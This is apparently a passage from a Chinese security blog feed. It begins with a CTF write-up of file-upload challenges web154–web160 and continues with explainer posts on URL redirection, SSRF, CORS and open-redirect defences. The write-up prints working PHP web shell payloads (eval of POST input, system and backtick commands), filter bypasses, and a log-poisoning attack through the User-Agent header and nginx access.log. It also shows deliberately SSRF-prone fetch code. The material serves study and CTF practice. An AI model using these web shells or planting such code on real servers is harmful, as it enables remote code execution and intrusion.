class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//获取文件名的信息。</span><br>            <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<span class="hljs-comment">//取出文件的扩展名</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ext_suffix</span>!=<span class="hljs-string">&#x27;php&#x27;</span>)&#123;<br>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<span class="hljs-comment">//获取文件上传的内容</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)==<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//弱比较</span><br>                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<span class="hljs-comment">//如果内容中不包含php，则成功上传</span><br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">3</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件内容不合规&quot;</span>);<br>                &#125;<br>                <br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>            &#125;<br>    <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>    &#125;<br>    <br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br></code></pre></td></tr></table></figure><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>web155和web154的区别在于upload.php对于字符检测所使用的函数不同 两段代码的主要差异在于检查文件内容是否包含“php”字符串时使用的函数：154代码使用 <em>strrpos($content, “php”) &#x3D;&#x3D; FALSE：</em> strrpos 查找字符串中“php”最后一次出现的位置（区分大小写），返回位置索引或 FALSE。 如果文件内容中包含“php”（如 &lt;?php），strrpos 返回非 FALSE，导致上传失败，返回错误代码 code&#x3D;&gt;3 和消息“文件内容不合规”。 155代码使用 <em>stripos($content, “php”) &#x3D;&#x3D;&#x3D; FALSE：</em> stripos 类似 strrpos，但不区分大小写，查找“php”第一次出现的位置。 使用严格比较 &#x3D;&#x3D;&#x3D; FALSE，检查是否完全没有找到“php”（如 PHP 或 php）。 如果文件内容包含“php”或“PHP”，上传失败，返回错误代码 code&#x3D;&gt;2 和消息“文件类型不合规”。 如果154使用php短标签，则可以通杀这道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//强比较</span><br>                   <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br></code></pre></td></tr></table></figure><p><img src="/../images/02a295ad4b5f52df2811e78b3dc63672.png" alt="02a295ad4b5f52df2811e78b3dc63672"></p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>上传 1.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>提示文件类型不合规,猜测是检测到了敏感字符,发现是过滤了[]</p><p>使用{}绕过</p><p>也可以使用<code>filter_input</code>绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>过滤了；</p><p>关于短标签分号的使用</p><ol><li><p><strong>如果一个PHP语句是代码块中的最后一个语句，并且它后面紧跟着 ?&gt; 结束标签，那么这个语句末尾的分号 ; 可以被省略。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-string">&quot;Hello World&quot;</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>当有多个表达式需要输出时，需要使用分号分隔</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-variable">$var1</span>; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p> 所以这题短标签末尾不用;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>))<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>或者换个语句直接输出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac ../flag.*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>绕过（）   可用反引号, 当 PHP 遇到反引号中的内容时,它会尝试将反引号内的字符串作为 shell 命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../flag*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>绕过log和反引号和空格，尝试用日志包含。</p><p>日志包含攻击是一种利用本地文件包含(LFI)漏洞的技术：</p><ol><li>攻击者向服务器发送包含PHP代码的请求</li><li>服务器将这些请求记录到日志文件中</li><li>攻击者利用LFI漏洞包含日志文件</li><li>服务器执行日志文件中的PHP代码，导致远程代码执行</li></ol><p>写法是为了绕过一些简单的字符串过滤，将log和access.log字符串拼接起来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&#x27;/var/l&#x27;</span>.<span class="hljs-string">&#x27;og/nginx/access.lo&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>加上ua头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个ua请求会被Nginx记录到access.log中，所以access.log文件中就包含了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码。</p><p>直接连接即可</p><p>注意：include后不可加空格，前后引号保持一致。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>URL重定向与SSRF与CORS跨域</title>
    <link href="/2025/04/23/URL%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8ESSRF%E4%B8%8ECORS%E8%B7%A8%E5%9F%9F/"/>
    <url>/2025/04/23/URL%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8ESSRF%E4%B8%8ECORS%E8%B7%A8%E5%9F%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="URL重定向与SSRF"><a href="#URL重定向与SSRF" class="headerlink" title="URL重定向与SSRF"></a>URL重定向与SSRF</h1><p>URL重定向（URL Redirection）和服务器端请求伪造（Server-Side Request Forgery, SSRF）是两种截然不同的概念，它们在目的、执行者和安全影响上有着本质的区别。</p><h3 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a><strong>URL重定向</strong></h3><p>URL重定向是一种网站技术，指当用户访问某个网址时，自动将其导向另一个网址。 这种技术通常用于正当目的，例如：</p><ul><li><strong>网站迁移</strong>：将旧域名的流量引导至新域名。</li><li><strong>简化URL</strong>：将冗长复杂的网址转换为更短、更易于记忆的链接。</li><li><strong>站点维护</strong>：在网站维护期间临时将用户导向一个通知页面。</li></ul><p>在URL重定向中，请求的发起者是用户的<strong>浏览器（客户端）</strong>。服务器在收到初始请求后，会返回一个特殊的HTTP响应（如301永久重定向或302临时重定向），浏览器在解析这个响应后，会再发起一个新的请求到目标URL。</p><h3 id="服务器端请求伪造-SSRF"><a href="#服务器端请求伪造-SSRF" class="headerlink" title="服务器端请求伪造 (SSRF)"></a><strong>服务器端请求伪造 (SSRF)</strong></h3><p>服务器端请求伪造（SSRF）是一种网络安全漏洞，攻击者可以利用这个漏洞来滥用服务器功能，让服务器代替攻击者发起请求，从而访问或操作那些攻击者无法直接访问的内部系统或数据。</p><p>在SSRF攻击中，请求的发起者是<strong>存在漏洞的服务器</strong>。攻击者通过构造恶意的请求，诱使服务器向其指定的URL（通常是内部网络或本地回环地址）发送请求。</p><h3 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a><strong>主要区别</strong></h3><table><thead><tr><th>特征</th><th>URL重定向</th><th>服务器端请求伪造 (SSRF)</th></tr></thead><tbody><tr><td><strong>发起者</strong></td><td>用户的浏览器（客户端）</td><td>Web应用程序所在的服务器（服务端）</td></tr><tr><td><strong>目的</strong></td><td>通常是合法的，用于网站管理和用户体验优化</td><td>恶意的，旨在攻击服务器及其内部网络</td></tr><tr><td><strong>控制方</strong></td><td>网站管理员设置重定向规则</td><td>攻击者利用漏洞构造并发送恶意请求</td></tr><tr><td><strong>影响</strong></td><td><strong>对用户的影响</strong>：用户被导向不同的网页。如果被恶意利用，可能导致钓鱼攻击。</td><td><strong>对服务器的影响</strong>：攻击者可以利用服务器作为代理，扫描内部网络、攻击内部服务、读取本地文件或窃取敏感数据，绕过防火墙等安全防护。</td></tr><tr><td><strong>本质</strong></td><td>一种<strong>网站功能</strong></td><td>一种<strong>安全漏洞</strong></td></tr></tbody></table><p>简而言之，<strong>URL重定向是让用户的浏览器去访问另一个地址，而SSRF是欺骗服务器去访问一个地址</strong>。前者是服务器指挥浏览器，后者是攻击者指挥服务器。这个根本性的差异导致了它们在应用场景和安全风险上的巨大不同。</p><h1 id="URL重定向与SSRF与CORS跨域"><a href="#URL重定向与SSRF与CORS跨域" class="headerlink" title="URL重定向与SSRF与CORS跨域"></a>URL重定向与SSRF与CORS跨域</h1><p>URL重定向（URL Redirection）、服务器端请求伪造（SSRF）和跨域资源共享（CORS）这三者之间的区别。</p><p>这三者涉及到网络请求和资源访问，但它们的机制、目的和安全关注点完全不同。</p><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><ul><li><strong>URL重定向 (URL Redirection):</strong> 一种服务器或客户端行为，目的是将一个URL的访问请求自动导向另一个URL。</li><li><strong>服务器端请求伪造 (SSRF):</strong> 一种安全漏洞，攻击者利用该漏洞，诱使服务器代替攻击者发起请求到一个攻击者指定的地址。</li><li><strong>跨域资源共享 (CORS):</strong> 一种浏览器安全机制，用于允许或限制网页脚本从一个源（origin）向另一个源发起跨域HTTP请求。</li></ul><h3 id="主要区别对比表"><a href="#主要区别对比表" class="headerlink" title="主要区别对比表"></a>主要区别对比表</h3><p>为了更清晰地理解，我们可以从以下几个维度进行对比：</p><table><thead><tr><th>特征维度</th><th>URL重定向</th><th>服务器端请求伪造 (SSRF)</th><th>跨域资源共享 (CORS)</th></tr></thead><tbody><tr><td><strong>发起方</strong></td><td>用户的<strong>浏览器</strong>（在收到服务器的重定向指令后）</td><td>存在漏洞的<strong>Web服务器</strong>（受攻击者控制）</td><td>用户的<strong>浏览器</strong>（由网页中的脚本如JavaScript发起）</td></tr><tr><td><strong>请求方向</strong></td><td>浏览器 -&gt; 服务器A -&gt; (重定向指令) -&gt; 浏览器 -&gt; 服务器B</td><td>攻击者 -&gt; 服务器A -&gt; (伪造的请求) -&gt; 目标服务器B (通常是内部网络或本地)</td><td>浏览器 (运行着源A的脚本) -&gt; 目标服务器B</td></tr><tr><td><strong>本质与目的</strong></td><td>一种<strong>网站功能</strong>，用于网站导航、域名变更等。</td><td>一种<strong>安全漏洞</strong>，目的是利用服务器作为代理来攻击内部系统。</td><td>一种<strong>浏览器安全策略</strong>，目的是在受控的情况下允许跨源请求，以增强Web应用的灵活性。</td></tr><tr><td><strong>谁来控制</strong></td><td><strong>网站开发者&#x2F;管理员</strong>设置重定向规则。</td><td><strong>攻击者</strong>通过构造恶意输入来控制服务器发起的请求。</td><td>由<strong>目标服务器B</strong>通过设置特定的HTTP响应头（如 <code>Access-Control-Allow-Origin</code>）来决定是否允许来自<strong>源A</strong>的请求。</td></tr><tr><td><strong>安全关注点</strong></td><td><strong>开放重定向 (Open Redirect)</strong>：如果重定向的目标URL可被用户任意控制，攻击者可能利用它将用户重定向到恶意网站，进行钓鱼攻击。</td><td>攻击内部网络、端口扫描、读取本地敏感文件、执行远程命令等，是<strong>服务端</strong>的严重安全风险。</td><td>防止恶意网站脚本在用户不知情的情况下，读取或操作用户在其他网站上的敏感数据，是<strong>浏览器端</strong>为了保护用户数据而设定的安全机制。</td></tr></tbody></table><h3 id="场景类比"><a href="#场景类比" class="headerlink" title="场景类比"></a>场景类比</h3><p>为了帮助理解，我们可以做一个简单的比喻：</p><ul><li><strong>URL重定向</strong>：你（浏览器）去A公司找人，A公司的前台告诉你：“你要找的人已经搬到B公司了”，于是你自己（浏览器）跑到B公司去。 <strong>整个过程的主动权在你（浏览器）手上</strong>。</li><li><strong>SSRF</strong>：你（攻击者）打电话给A公司（存在漏洞的服务器），骗前台说：“麻烦你帮我给你们的CEO打个内部电话（内部网络），告诉他一件事”。A公司的前台（服务器）信以为真，就用内部电话帮你传话了。 <strong>你利用了A公司的身份和权限去办事</strong>。</li><li><strong>CORS</strong>：你（运行在浏览器上的A网站脚本）想直接从你的工位上拿一份B公司的内部文件（跨域请求资源）。B公司的安保系统（浏览器同源策略）拦住了你，说：“不行，不同公司的人不能随便拿东西”。但如果B公司（目标服务器）的门口贴了一张告示：“欢迎A公司的员工来取文件”（设置了CORS响应头），那么安保系统（浏览器）就会放行。 <strong>这是B公司决定是否给你权限</strong>。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>URL重定向</strong>和<strong>CORS</strong>的请求发起方都是<strong>浏览器</strong>，而<strong>SSRF</strong>的发起方是<strong>服务器</strong>。</li><li><strong>URL重定向</strong>是一种功能，<strong>SSRF</strong>是一种漏洞，<strong>CORS</strong>是一种安全机制。</li><li>它们解决的问题完全不同：URL重定向解决的是**“去哪里”<strong>的问题；SSRF利用的是</strong>“让服务器替我请求”<strong>的漏洞；CORS解决的是浏览器脚本</strong>“能不能跨域请求资源”**的权限问题。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>URL</title>
    <link href="/2025/04/22/URL%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2025/04/22/URL%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h3 id="URL重定向漏洞：一种看似无害的巨大风险"><a href="#URL重定向漏洞：一种看似无害的巨大风险" class="headerlink" title="URL重定向漏洞：一种看似无害的巨大风险"></a>URL重定向漏洞：一种看似无害的巨大风险</h3><p>URL重定向漏洞，也称为“开放重定向”（Open Redirect），是一种常见的Web应用程序安全漏洞。它的核心问题在于，<strong>Web应用程序接收并使用用户提供的不可信输入来构造重定向URL，但没有对这个输入进行充分的验证</strong>。</p><p>这使得攻击者可以制作一个看起来指向合法、可信网站的链接，但当用户点击时，会被悄无声息地重定向到一个由攻击者控制的恶意网站。</p><h4 id="漏洞是如何产生的？"><a href="#漏洞是如何产生的？" class="headerlink" title="漏洞是如何产生的？"></a>漏洞是如何产生的？</h4><p>许多网站为了方便用户，都提供了URL跳转功能。一个典型的例子是登录成功后的跳转。例如，一个网站的登录链接可能是这样的：</p><p><code>https://www.example.com/login?redirect_url=/user/dashboard</code></p><p>当用户输入正确的用户名和密码后，网站服务器会读取 <code>redirect_url</code> 参数的值（这里是 <code>/user/dashboard</code>），然后将用户浏览器重定向到这个指定的页面。</p><p>如果网站开发者没有对 <code>redirect_url</code> 参数进行严格的检查，攻击者就可以构造一个恶意的链接：</p><p><code>https://www.example.com/login?redirect_url=https://www.evil-site.com</code></p><p><strong>攻击流程如下：</strong></p><ol><li><strong>构造恶意链接</strong>：攻击者将 <code>redirect_url</code> 参数替换为指向恶意网站的地址。</li><li><strong>伪装与诱导</strong>：攻击者通过电子邮件、社交媒体等方式，将这个精心构造的链接发送给受害者。由于链接的域名部分 <code>www.example.com</code> 是用户信任的合法网站，用户很可能会放松警惕并点击链接。</li><li><strong>重定向至恶意网站</strong>：用户点击链接后，会首先访问合法的 <code>example.com</code>。网站服务器在处理请求时，未经校验就直接读取了 <code>redirect_url</code> 参数，并向用户的浏览器发送一个重定向指令，将其导向 <code>https://www.evil-site.com</code>。</li><li><strong>实施攻击</strong>：一旦用户被重定向到恶意网站，攻击者就可以实施各种网络攻击。</li></ol><h4 id="URL重定向漏洞的主要危害"><a href="#URL重定向漏洞的主要危害" class="headerlink" title="URL重定向漏洞的主要危害"></a>URL重定向漏洞的主要危害</h4><p>尽管URL重定向本身不直接窃取数据或执行代码，但它却是许多其他严重攻击的“跳板”，其主要危害包括：</p><ol><li><p><strong>网络钓鱼（Phishing）</strong>：这是最常见的利用方式。攻击者可以将用户重定向到一个与原网站界面一模一样的假冒网站，诱骗用户输入用户名、密码、银行卡号、信用卡信息等敏感凭证。</p></li><li><p><strong>传播恶意软件</strong>：攻击者可以将用户重定向到一个包含恶意脚本或提供恶意软件下载的网站。用户可能会在不知不觉中下载并安装病毒、木马或勒索软件。</p></li><li><p><strong>绕过安全过滤和信任机制</strong>：由于初始链接来自受信任的域名，它可以绕过一些基于域名的垃圾邮件过滤器或用户的警惕心理。</p></li><li><p><strong>结合其他漏洞发起攻击</strong>：URL重定向可以与其他漏洞（如跨站脚本XSS）结合，例如，将用户重定向到一个包含<code>data:</code>或<code>javascript:</code>协议的URL，可能直接在用户的浏览器中执行恶意脚本。</p></li></ol><h4 id="如何识别和防范URL重定向漏洞？"><a href="#如何识别和防范URL重定向漏洞？" class="headerlink" title="如何识别和防范URL重定向漏洞？"></a>如何识别和防范URL重定向漏洞？</h4><p>对于普通用户和网站开发者来说，可以采取以下措施：</p><p><strong>面向开发者&#x2F;网站管理员：</strong></p><ul><li><strong>避免使用重定向</strong>：如果非必要，尽量不要让应用程序根据用户的输入进行重定向。</li><li><strong>使用白名单验证</strong>：这是最有效的防御方法。创建一个包含所有允许跳转的安全URL列表。在执行重定向之前，严格检查 <code>redirect_url</code> 参数的值是否在该白名单内。如果不在，则拒绝跳转或跳转到一个默认的安全页面。</li><li><strong>对参数进行严格校验</strong>：如果无法使用白名单，应对跳转参数进行严格的格式和内容校验，例如，只允许跳转到本站的相对路径（如 <code>/user/dashboard</code>），并严格过滤掉 <code>http://</code>, <code>https://</code>, <code>//</code> 等可能指向外部站点的字符串。</li><li><strong>生成跳转确认页面</strong>：在执行重定向前，向用户显示一个提示页面，明确告知用户“您即将离开本站，前往[目标URL]，请确认风险”，由用户手动确认后才进行跳转。</li></ul><p><strong>面向普通用户：</strong></p><ul><li><strong>保持警惕</strong>：在点击任何链接之前，尤其是在邮件和即时消息中，要仔细检查链接的完整性。</li><li><strong>查看浏览器地址栏</strong>：在输入任何敏感信息之前，务必确认浏览器地址栏中的域名是否是您期望访问的官方网站。</li><li><strong>使用安全工具</strong>：安装可靠的安全软件和浏览器插件，它们可以帮助识别和阻止已知的恶意网站。</li></ul><p>总之，URL重定向漏洞利用了用户对知名网站的信任，是一个隐蔽但危险的攻击入口。通过开发者侧严格的安全控制和用户侧谨慎的使用习惯，可以有效规避其带来的风险。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2025/04/19/SSRF/"/>
    <url>/2025/04/19/SSRF/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/SSRF3.png"></p><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><p>SSRF，Server-Side Request Forgery，<strong>服务端请求伪造</strong>，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><p><img src="/images/SSRF1.jpg"></p><h2 id="SSRF-漏洞出现的场景"><a href="#SSRF-漏洞出现的场景" class="headerlink" title="SSRF 漏洞出现的场景"></a>SSRF 漏洞出现的场景</h2><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><h2 id="SSRF漏洞的检测方法"><a href="#SSRF漏洞的检测方法" class="headerlink" title="SSRF漏洞的检测方法"></a>SSRF漏洞的检测方法</h2><ul><li>抓包分析发送的请求是否是由服务器发送的</li><li>从页面源码中查找访问的资源地址</li></ul><h2 id="常用的后端实现"><a href="#常用的后端实现" class="headerlink" title="常用的后端实现"></a>常用的后端实现</h2><p><img src="/images/SSRF2.png"></p><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br>    <span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br>    <span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户指定 URL 